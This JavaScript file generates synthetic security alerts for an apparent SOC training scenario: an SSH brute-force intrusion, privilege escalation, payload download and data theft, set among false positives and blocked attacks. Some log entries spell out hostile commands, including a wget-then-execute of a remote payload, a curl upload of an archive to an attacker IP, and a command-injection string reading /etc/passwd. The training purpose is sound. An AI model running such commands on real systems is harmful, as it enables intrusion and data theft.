// === LEVEL 3: LINUX SSH ATTACK - ALERT GENERATOR ===
// Generates alerts from parsed and normalized logs

const fs = require('fs');
const path = require('path');

function generateLevel3Alerts() {
  const alerts = [];
  let alertIdCounter = 0;

  function createAlert(type, severity, description, linkedLog) {
    alertIdCounter++;
    return {
      alert_id: generateId(),
      alert_type: type,
      severity: severity,
      timestamp: linkedLog?.['@timestamp'] || new Date().toISOString(),
      source_ip: linkedLog?.['source.ip'] || 'unknown',
      destination_ip: linkedLog?.['destination.ip'] || 'unknown',
      event_action: linkedLog?.['event.action'] || 'unknown',
      event_type: linkedLog?.['event.type'] || 'unknown',
      user_name: linkedLog?.['user.name'] || 'unknown',
      linked_log: linkedLog || {}
    };
  }

  function generateId() {
    return Math.random().toString(16).substring(2, 14);
  }

  // === TRUE POSITIVES: SSH Brute-Force + Privilege Escalation + Malware + Exfiltration ===
  
  // 1. SSH Brute-Force Attempts (Multiple Failures)
  alerts.push(createAlert('ssh_brute_force', 'high', 'Multiple SSH login failures detected', {
    'log.original': 'Failed password for invalid user admin from 185.122.21.55 port 45811 ssh2',
    '@timestamp': '2024-01-12T08:15:21Z',
    'event.action': 'failed_login',
    'event.type': 'ssh',
    'source.ip': '185.122.21.55',
    'destination.ip': '203.0.113.50',
    'user.name': 'unknown'
  }));

  alerts.push(createAlert('ssh_brute_force', 'high', 'Multiple SSH login failures - root account', {
    'log.original': 'Failed password for root from 185.122.21.55 port 45812 ssh2',
    '@timestamp': '2024-01-12T08:15:23Z',
    'event.action': 'failed_login',
    'event.type': 'ssh',
    'source.ip': '185.122.21.55',
    'destination.ip': '203.0.113.50',
    'user.name': 'root'
  }));

  // 2. SSH Successful Login (ATTACKER) - TP
  alerts.push(createAlert('ssh_successful_login', 'critical', 'SSH login successful for developer from external IP', {
    'log.original': 'Accepted password for developer from 185.122.21.55 port 45821 ssh2',
    '@timestamp': '2024-01-12T08:16:15Z',
    'event.action': 'successful_login',
    'event.type': 'ssh',
    'source.ip': '185.122.21.55',
    'destination.ip': '203.0.113.50',
    'user.name': 'developer'
  }));

  // 3. Privilege Escalation Attempt (Failed)
  alerts.push(createAlert('privilege_escalation_attempt', 'high', 'Sudo privilege escalation attempt - user NOT in sudoers', {
    'log.original': 'sudo: developer : user NOT in sudoers ; TTY=pts/1 ; COMMAND=/bin/bash',
    '@timestamp': '2024-01-12T08:17:02Z',
    'event.action': 'privilege_escalation_attempt',
    'event.type': 'sudo',
    'source.ip': '203.0.113.50',
    'destination.ip': '203.0.113.50',
    'user.name': 'developer'
  }));

  // 4. Privilege Escalation Successful - TP
  alerts.push(createAlert('privilege_escalation_success', 'critical', 'Privilege escalation to root successful', {
    'log.original': 'sudo: pam_unix(sudo:session): session opened for user root by developer(uid=1002)',
    '@timestamp': '2024-01-12T08:17:15Z',
    'event.action': 'privilege_escalation_success',
    'event.type': 'sudo',
    'source.ip': '203.0.113.50',
    'destination.ip': '203.0.113.50',
    'user.name': 'developer'
  }));

  // 5. Malware Download - TP
  alerts.push(createAlert('malware_download', 'critical', 'Suspicious file download from external IP', {
    'log.original': 'wget http://185.122.21.55/payload.sh -O /tmp/payload.sh',
    '@timestamp': '2024-01-12T08:18:02Z',
    'event.action': 'download',
    'event.type': 'file_download',
    'source.ip': '203.0.113.50',
    'destination.ip': '185.122.21.55',
    'user.name': 'root'
  }));

  // 6. Malware Execution - TP
  alerts.push(createAlert('malware_execution', 'critical', 'Suspicious script execution as root', {
    'log.original': 'chmod +x /tmp/payload.sh && /tmp/payload.sh',
    '@timestamp': '2024-01-12T08:18:05Z',
    'event.action': 'execution',
    'event.type': 'process',
    'source.ip': '203.0.113.50',
    'destination.ip': '203.0.113.50',
    'user.name': 'root'
  }));

  // 7. Data Exfiltration - TP
  alerts.push(createAlert('data_exfiltration', 'critical', 'Sensitive data exfiltration to external IP', {
    'log.original': 'curl -X POST -F "file=@/tmp/logs_backup.tar.gz" http://185.122.21.55/upload',
    '@timestamp': '2024-01-12T08:18:30Z',
    'event.action': 'exfiltration',
    'event.type': 'network_traffic',
    'source.ip': '203.0.113.50',
    'destination.ip': '185.122.21.55',
    'user.name': 'root'
  }));

  // 8. Suspicious Log Collection - TP
  alerts.push(createAlert('suspicious_data_collection', 'high', 'Suspicious compression of web server logs', {
    'log.original': 'tar -czf /tmp/logs_backup.tar.gz /var/www/html/logs/',
    '@timestamp': '2024-01-12T08:18:22Z',
    'event.action': 'compression',
    'event.type': 'file_operation',
    'source.ip': '203.0.113.50',
    'destination.ip': '203.0.113.50',
    'user.name': 'root'
  }));

  // === FALSE POSITIVES: Legitimate Activity ===

  // 9. SSH Login - Legitimate Admin (Internal IP)
  alerts.push(createAlert('ssh_successful_login', 'low', 'SSH login successful for admin from internal IP', {
    'log.original': 'Accepted publickey for admin from 192.168.1.100 port 52341 ssh2',
    '@timestamp': '2024-01-12T09:20:45Z',
    'event.action': 'successful_login',
    'event.type': 'ssh',
    'source.ip': '192.168.1.100',
    'destination.ip': '203.0.113.50',
    'user.name': 'admin'
  }));

  // 10. Sudo - Legitimate Admin Activity
  alerts.push(createAlert('privilege_escalation_success', 'low', 'Privilege escalation to root - admin maintenance', {
    'log.original': 'sudo: admin : TTY=pts/2 ; USER=root ; COMMAND=/usr/bin/apt update',
    '@timestamp': '2024-01-12T09:25:12Z',
    'event.action': 'privilege_escalation_success',
    'event.type': 'sudo',
    'source.ip': '192.168.1.100',
    'destination.ip': '203.0.113.50',
    'user.name': 'admin'
  }));

  // 11. Scheduled Backup Task
  alerts.push(createAlert('file_compression', 'low', 'Scheduled daily backup task', {
    'log.original': 'cron[7823]: (root) CMD (tar -czf /home/backups/daily.tar.gz /var/log/)',
    '@timestamp': '2024-01-12T09:30:22Z',
    'event.action': 'compression',
    'event.type': 'scheduled_task',
    'source.ip': '203.0.113.50',
    'destination.ip': '203.0.113.50',
    'user.name': 'root'
  }));

  // === FAILED EXTERNAL ATTACKS ===

  // 12. SSH Brute-Force - Failed (Different Attacker)
  alerts.push(createAlert('ssh_brute_force', 'low', 'SSH brute-force attempts - blocked', {
    'log.original': 'Failed password for invalid user guest from 203.45.67.89 port 38234 ssh2',
    '@timestamp': '2024-01-12T10:15:33Z',
    'event.action': 'failed_login',
    'event.type': 'ssh',
    'source.ip': '203.45.67.89',
    'destination.ip': '203.0.113.50',
    'user.name': 'unknown'
  }));

  // 13. SQL Injection Attempt - Blocked by IDS
  alerts.push(createAlert('sql_injection_attempt', 'low', 'SQL injection attempt - blocked by IDS', {
    'log.original': '[IDS] DENY SQL_INJECTION attempt from 198.76.54.32 to /api/login',
    '@timestamp': '2024-01-12T11:30:22Z',
    'event.action': 'blocked',
    'event.type': 'sql_injection',
    'source.ip': '198.76.54.32',
    'destination.ip': '203.0.113.50',
    'user.name': 'unknown'
  }));

  // 14. XSS Attack - Blocked by WAF
  alerts.push(createAlert('xss_attempt', 'low', 'XSS payload attempt - blocked by WAF', {
    'log.original': '[WAF] DENY XSS_PAYLOAD attempt from 212.34.56.78 to /search',
    '@timestamp': '2024-01-12T11:35:45Z',
    'event.action': 'blocked',
    'event.type': 'xss_attempt',
    'source.ip': '212.34.56.78',
    'destination.ip': '203.0.113.50',
    'user.name': 'unknown'
  }));

  // === ADDITIONAL ALERTS FOR VARIETY ===

  // 15. Network Connection to Attacker IP
  alerts.push(createAlert('suspicious_outbound_connection', 'critical', 'Outbound connection to attacker infrastructure', {
    'log.original': '[FIREWALL] ALLOW TCP 203.0.113.50:52342 -> 185.122.21.55:80 (HTTP)',
    '@timestamp': '2024-01-12T08:18:30Z',
    'event.action': 'allow',
    'event.type': 'network_traffic',
    'source.ip': '203.0.113.50',
    'destination.ip': '185.122.21.55',
    'user.name': 'root'
  }));

  // 16. HTTP GET for Malware Payload
  alerts.push(createAlert('malware_download', 'critical', 'HTTP request to download suspicious payload', {
    'log.original': '203.0.113.50 - - [12/Jan/2024:08:18:05] "GET /payload.sh HTTP/1.1" 200 1024 "-" "wget/1.20.3"',
    '@timestamp': '2024-01-12T08:18:05Z',
    'event.action': 'download',
    'event.type': 'http_request',
    'source.ip': '203.0.113.50',
    'destination.ip': '185.122.21.55',
    'user.name': 'root'
  }));

  // 17. HTTP POST for Data Upload
  alerts.push(createAlert('data_exfiltration', 'critical', 'HTTP POST request uploading compressed data', {
    'log.original': '203.0.113.50 - - [12/Jan/2024:08:18:30] "POST /upload HTTP/1.1" 200 512 "-" "curl/7.68.0"',
    '@timestamp': '2024-01-12T08:18:30Z',
    'event.action': 'upload',
    'event.type': 'http_request',
    'source.ip': '203.0.113.50',
    'destination.ip': '185.122.21.55',
    'user.name': 'root'
  }));

  // 18. Legitimate Web Server Access
  alerts.push(createAlert('http_request', 'low', 'Normal HTTP request from internal admin', {
    'log.original': '192.168.1.100 - - [12/Jan/2024:09:20:45] "GET /index.html HTTP/1.1" 200 2048 "-" "Mozilla/5.0"',
    '@timestamp': '2024-01-12T09:20:45Z',
    'event.action': 'request',
    'event.type': 'http_request',
    'source.ip': '192.168.1.100',
    'destination.ip': '203.0.113.50',
    'user.name': 'unknown'
  }));

  // === ADDITIONAL FALSE POSITIVES (Legitimate Activity) ===

  // 19. Legitimate SSH Login - DevOps Team
  alerts.push(createAlert('ssh_successful_login', 'low', 'SSH login by DevOps engineer', {
    'log.original': 'Accepted publickey for devops from 192.168.1.105 port 43221 ssh2',
    '@timestamp': '2024-01-12T07:30:12Z',
    'event.action': 'successful_login',
    'event.type': 'ssh',
    'source.ip': '192.168.1.105',
    'destination.ip': '203.0.113.50',
    'user.name': 'devops'
  }));

  // 20. System Update by Admin
  alerts.push(createAlert('privilege_escalation_success', 'low', 'Admin running system updates', {
    'log.original': 'sudo: admin : TTY=pts/3 ; USER=root ; COMMAND=/usr/bin/apt upgrade -y',
    '@timestamp': '2024-01-12T07:45:33Z',
    'event.action': 'privilege_escalation_success',
    'event.type': 'sudo',
    'source.ip': '192.168.1.100',
    'destination.ip': '203.0.113.50',
    'user.name': 'admin'
  }));

  // 21. Scheduled Database Backup
  alerts.push(createAlert('file_compression', 'low', 'Automated database backup job', {
    'log.original': 'cron[9012]: (postgres) CMD (pg_dump dbname | gzip > /backups/db_$(date +%Y%m%d).sql.gz)',
    '@timestamp': '2024-01-12T06:00:05Z',
    'event.action': 'compression',
    'event.type': 'scheduled_task',
    'source.ip': '203.0.113.50',
    'destination.ip': '203.0.113.50',
    'user.name': 'postgres'
  }));

  // 22. Legitimate File Download - Package Manager
  alerts.push(createAlert('http_request', 'low', 'Package download from official repository', {
    'log.original': '203.0.113.50 - - [12/Jan/2024:07:45:35] "GET /ubuntu/pool/main/nginx.deb HTTP/1.1" 200 8192 "-" "apt/2.0.2"',
    '@timestamp': '2024-01-12T07:45:35Z',
    'event.action': 'download',
    'event.type': 'http_request',
    'source.ip': '203.0.113.50',
    'destination.ip': '91.189.88.152',
    'user.name': 'root'
  }));

  // 23. Service Restart by Admin
  alerts.push(createAlert('privilege_escalation_success', 'low', 'Admin restarting web service', {
    'log.original': 'sudo: admin : TTY=pts/2 ; USER=root ; COMMAND=/bin/systemctl restart nginx',
    '@timestamp': '2024-01-12T08:00:22Z',
    'event.action': 'privilege_escalation_success',
    'event.type': 'sudo',
    'source.ip': '192.168.1.100',
    'destination.ip': '203.0.113.50',
    'user.name': 'admin'
  }));

  // 24. Log Rotation - Automated
  alerts.push(createAlert('file_compression', 'low', 'Logrotate compressing old log files', {
    'log.original': 'logrotate[4523]: (root) CMD (gzip /var/log/syslog.1)',
    '@timestamp': '2024-01-12T06:25:15Z',
    'event.action': 'compression',
    'event.type': 'scheduled_task',
    'source.ip': '203.0.113.50',
    'destination.ip': '203.0.113.50',
    'user.name': 'root'
  }));

  // 25. SSH Login - Monitoring System
  alerts.push(createAlert('ssh_successful_login', 'low', 'Automated monitoring connection', {
    'log.original': 'Accepted publickey for monitor from 192.168.1.200 port 55123 ssh2',
    '@timestamp': '2024-01-12T08:05:00Z',
    'event.action': 'successful_login',
    'event.type': 'ssh',
    'source.ip': '192.168.1.200',
    'destination.ip': '203.0.113.50',
    'user.name': 'monitor'
  }));

  // 26. Cron Job - Security Scan
  alerts.push(createAlert('privilege_escalation_success', 'low', 'Scheduled security scan by root', {
    'log.original': 'cron[8234]: (root) CMD (/usr/bin/clamscan -r /var/www/html)',
    '@timestamp': '2024-01-12T05:00:00Z',
    'event.action': 'privilege_escalation_success',
    'event.type': 'scheduled_task',
    'source.ip': '203.0.113.50',
    'destination.ip': '203.0.113.50',
    'user.name': 'root'
  }));

  // 27. Legitimate API Access
  alerts.push(createAlert('http_request', 'low', 'API health check from monitoring server', {
    'log.original': '192.168.1.200 - - [12/Jan/2024:08:10:00] "GET /api/health HTTP/1.1" 200 128 "-" "Nagios/4.4.5"',
    '@timestamp': '2024-01-12T08:10:00Z',
    'event.action': 'request',
    'event.type': 'http_request',
    'source.ip': '192.168.1.200',
    'destination.ip': '203.0.113.50',
    'user.name': 'monitor'
  }));

  // 28. Internal File Transfer
  alerts.push(createAlert('file_transfer', 'low', 'SCP file transfer between internal servers', {
    'log.original': 'scp: root@192.168.1.100 -> root@203.0.113.50:/tmp/config.tar.gz',
    '@timestamp': '2024-01-12T07:15:33Z',
    'event.action': 'transfer',
    'event.type': 'file_transfer',
    'source.ip': '192.168.1.100',
    'destination.ip': '203.0.113.50',
    'user.name': 'root'
  }));

  // === ADDITIONAL FAILED EXTERNAL ATTACKS ===

  // 29. Port Scan Detected
  alerts.push(createAlert('port_scan', 'low', 'Port scan activity from external IP - blocked', {
    'log.original': '[IDS] DENY PORT_SCAN from 198.51.100.23 scanning ports 20-1024',
    '@timestamp': '2024-01-12T10:22:45Z',
    'event.action': 'blocked',
    'event.type': 'port_scan',
    'source.ip': '198.51.100.23',
    'destination.ip': '203.0.113.50',
    'user.name': 'unknown'
  }));

  // 30. Directory Traversal Attempt
  alerts.push(createAlert('directory_traversal', 'low', 'Directory traversal attack - blocked by WAF', {
    'log.original': '[WAF] DENY PATH_TRAVERSAL from 203.98.76.54 to /../../etc/passwd',
    '@timestamp': '2024-01-12T11:40:12Z',
    'event.action': 'blocked',
    'event.type': 'directory_traversal',
    'source.ip': '203.98.76.54',
    'destination.ip': '203.0.113.50',
    'user.name': 'unknown'
  }));

  // 31. Command Injection Attempt
  alerts.push(createAlert('command_injection', 'low', 'Command injection attempt - blocked', {
    'log.original': '[WAF] DENY CMD_INJECTION from 198.76.54.32 to /api/ping?host=8.8.8.8;cat%20/etc/passwd',
    '@timestamp': '2024-01-12T11:45:23Z',
    'event.action': 'blocked',
    'event.type': 'command_injection',
    'source.ip': '198.76.54.32',
    'destination.ip': '203.0.113.50',
    'user.name': 'unknown'
  }));

  // 32. Brute Force - Different IP
  alerts.push(createAlert('ssh_brute_force', 'low', 'SSH brute-force from scanner - all attempts failed', {
    'log.original': 'Failed password for invalid user test from 104.223.45.67 port 22334 ssh2',
    '@timestamp': '2024-01-12T09:15:44Z',
    'event.action': 'failed_login',
    'event.type': 'ssh',
    'source.ip': '104.223.45.67',
    'destination.ip': '203.0.113.50',
    'user.name': 'unknown'
  }));

  // 33. XML External Entity (XXE) Attack
  alerts.push(createAlert('xxe_attack', 'low', 'XXE attack attempt - blocked by parser', {
    'log.original': '[WAF] DENY XXE_PAYLOAD from 212.34.56.78 to /api/upload',
    '@timestamp': '2024-01-12T11:50:33Z',
    'event.action': 'blocked',
    'event.type': 'xxe_attack',
    'source.ip': '212.34.56.78',
    'destination.ip': '203.0.113.50',
    'user.name': 'unknown'
  }));

  // 34. LDAP Injection Attempt
  alerts.push(createAlert('ldap_injection', 'low', 'LDAP injection detected - request denied', {
    'log.original': '[IDS] DENY LDAP_INJECTION from 198.51.100.45 to /auth/login',
    '@timestamp': '2024-01-12T12:00:12Z',
    'event.action': 'blocked',
    'event.type': 'ldap_injection',
    'source.ip': '198.51.100.45',
    'destination.ip': '203.0.113.50',
    'user.name': 'unknown'
  }));

  // 35. File Upload - Malicious Extension
  alerts.push(createAlert('malicious_file_upload', 'low', 'File upload with suspicious extension - quarantined', {
    'log.original': '[WAF] QUARANTINE malicious.php.jpg from 203.45.67.89 to /uploads/',
    '@timestamp': '2024-01-12T12:05:45Z',
    'event.action': 'quarantined',
    'event.type': 'file_upload',
    'source.ip': '203.45.67.89',
    'destination.ip': '203.0.113.50',
    'user.name': 'unknown'
  }));

  // === MORE FALSE POSITIVES ===

  // 36. Legitimate User Session
  alerts.push(createAlert('ssh_successful_login', 'low', 'Developer SSH login from corporate VPN', {
    'log.original': 'Accepted publickey for dev_john from 192.168.1.150 port 48822 ssh2',
    '@timestamp': '2024-01-12T09:30:15Z',
    'event.action': 'successful_login',
    'event.type': 'ssh',
    'source.ip': '192.168.1.150',
    'destination.ip': '203.0.113.50',
    'user.name': 'dev_john'
  }));

  // 37. Git Pull Operation
  alerts.push(createAlert('http_request', 'low', 'Git repository sync from GitHub', {
    'log.original': '203.0.113.50 - - [12/Jan/2024:09:35:22] "GET /repo/project.git HTTP/1.1" 200 4096 "-" "git/2.25.1"',
    '@timestamp': '2024-01-12T09:35:22Z',
    'event.action': 'request',
    'event.type': 'http_request',
    'source.ip': '203.0.113.50',
    'destination.ip': '140.82.113.3',
    'user.name': 'dev_john'
  }));

  // 38. Firewall Rule Update
  alerts.push(createAlert('privilege_escalation_success', 'low', 'Admin updating firewall rules', {
    'log.original': 'sudo: admin : TTY=pts/1 ; USER=root ; COMMAND=/usr/sbin/ufw allow 8080/tcp',
    '@timestamp': '2024-01-12T10:00:45Z',
    'event.action': 'privilege_escalation_success',
    'event.type': 'sudo',
    'source.ip': '192.168.1.100',
    'destination.ip': '203.0.113.50',
    'user.name': 'admin'
  }));

  // 39. Certificate Renewal
  alerts.push(createAlert('privilege_escalation_success', 'low', 'Automated SSL certificate renewal', {
    'log.original': 'cron[7123]: (root) CMD (/usr/bin/certbot renew --quiet)',
    '@timestamp': '2024-01-12T04:00:00Z',
    'event.action': 'privilege_escalation_success',
    'event.type': 'scheduled_task',
    'source.ip': '203.0.113.50',
    'destination.ip': '203.0.113.50',
    'user.name': 'root'
  }));

  // 40. DNS Query - Normal
  alerts.push(createAlert('dns_query', 'low', 'Normal DNS resolution for external service', {
    'log.original': 'query: api.example.com IN A from 203.0.113.50',
    '@timestamp': '2024-01-12T08:15:00Z',
    'event.action': 'query',
    'event.type': 'dns',
    'source.ip': '203.0.113.50',
    'destination.ip': '8.8.8.8',
    'user.name': 'unknown'
  }));

  // === MORE FAILED ATTACKS ===

  // 41. HTTP Flood Attempt
  alerts.push(createAlert('ddos_attempt', 'low', 'HTTP flood detected - rate limited', {
    'log.original': '[RATE_LIMIT] DENY excessive requests from 198.51.100.67 (500 req/sec)',
    '@timestamp': '2024-01-12T12:10:33Z',
    'event.action': 'rate_limited',
    'event.type': 'ddos',
    'source.ip': '198.51.100.67',
    'destination.ip': '203.0.113.50',
    'user.name': 'unknown'
  }));

  // 42. SSH Key Brute Force
  alerts.push(createAlert('ssh_brute_force', 'low', 'SSH public key authentication failures', {
    'log.original': 'Failed publickey for root from 45.76.123.89 port 33445 ssh2',
    '@timestamp': '2024-01-12T10:45:12Z',
    'event.action': 'failed_login',
    'event.type': 'ssh',
    'source.ip': '45.76.123.89',
    'destination.ip': '203.0.113.50',
    'user.name': 'root'
  }));

  // 43. CSRF Token Validation Failure
  alerts.push(createAlert('csrf_attempt', 'low', 'CSRF token mismatch - request rejected', {
    'log.original': '[WAF] DENY CSRF_INVALID_TOKEN from 203.98.76.54 to /api/transfer',
    '@timestamp': '2024-01-12T12:15:22Z',
    'event.action': 'blocked',
    'event.type': 'csrf_attempt',
    'source.ip': '203.98.76.54',
    'destination.ip': '203.0.113.50',
    'user.name': 'unknown'
  }));

  // 44. Buffer Overflow Attempt
  alerts.push(createAlert('buffer_overflow', 'low', 'Buffer overflow pattern detected - blocked', {
    'log.original': '[IDS] DENY BUFFER_OVERFLOW from 198.76.54.32 to /cgi-bin/vulnerable',
    '@timestamp': '2024-01-12T12:20:45Z',
    'event.action': 'blocked',
    'event.type': 'buffer_overflow',
    'source.ip': '198.76.54.32',
    'destination.ip': '203.0.113.50',
    'user.name': 'unknown'
  }));

  // 45. Reverse Shell Attempt
  alerts.push(createAlert('reverse_shell_attempt', 'low', 'Reverse shell payload detected - blocked', {
    'log.original': '[IDS] DENY REVERSE_SHELL from 212.34.56.78 to /api/exec',
    '@timestamp': '2024-01-12T12:25:33Z',
    'event.action': 'blocked',
    'event.type': 'reverse_shell',
    'source.ip': '212.34.56.78',
    'destination.ip': '203.0.113.50',
    'user.name': 'unknown'
  }));

  // 46. Credential Stuffing
  alerts.push(createAlert('credential_stuffing', 'low', 'Credential stuffing attack - account locked', {
    'log.original': '[AUTH] LOCKOUT account "admin" after 10 failed attempts from 104.223.45.67',
    '@timestamp': '2024-01-12T12:30:12Z',
    'event.action': 'locked',
    'event.type': 'authentication',
    'source.ip': '104.223.45.67',
    'destination.ip': '203.0.113.50',
    'user.name': 'admin'
  }));

  // 47. Malware Hash Detection
  alerts.push(createAlert('malware_signature', 'low', 'Known malware hash detected in upload - quarantined', {
    'log.original': '[ANTIVIRUS] QUARANTINE trojan.exe (MD5: d41d8cd98f00b204e9800998ecf8427e) from 203.45.67.89',
    '@timestamp': '2024-01-12T12:35:45Z',
    'event.action': 'quarantined',
    'event.type': 'malware_detection',
    'source.ip': '203.45.67.89',
    'destination.ip': '203.0.113.50',
    'user.name': 'unknown'
  }));

  // 48. WordPress Exploit Attempt
  alerts.push(createAlert('exploit_attempt', 'low', 'WordPress vulnerability scan - no WordPress installed', {
    'log.original': '[IDS] DENY WP_EXPLOIT from 198.51.100.23 to /wp-admin/admin-ajax.php',
    '@timestamp': '2024-01-12T12:40:22Z',
    'event.action': 'blocked',
    'event.type': 'exploit_attempt',
    'source.ip': '198.51.100.23',
    'destination.ip': '203.0.113.50',
    'user.name': 'unknown'
  }));

  return alerts;
}

// Generate and save alerts
const alerts = generateLevel3Alerts();
const outputPath = path.join(__dirname, '../Alert Generator/storage/level3/alerts.json');

// Ensure directory exists
const dir = path.dirname(outputPath);
if (!fs.existsSync(dir)) {
  fs.mkdirSync(dir, { recursive: true });
}

fs.writeFileSync(outputPath, JSON.stringify(alerts, null, 2));
console.log(`✅ Generated ${alerts.length} Level 3 alerts`);
console.log(`📁 Saved to: ${outputPath}`);

module.exports = alerts;
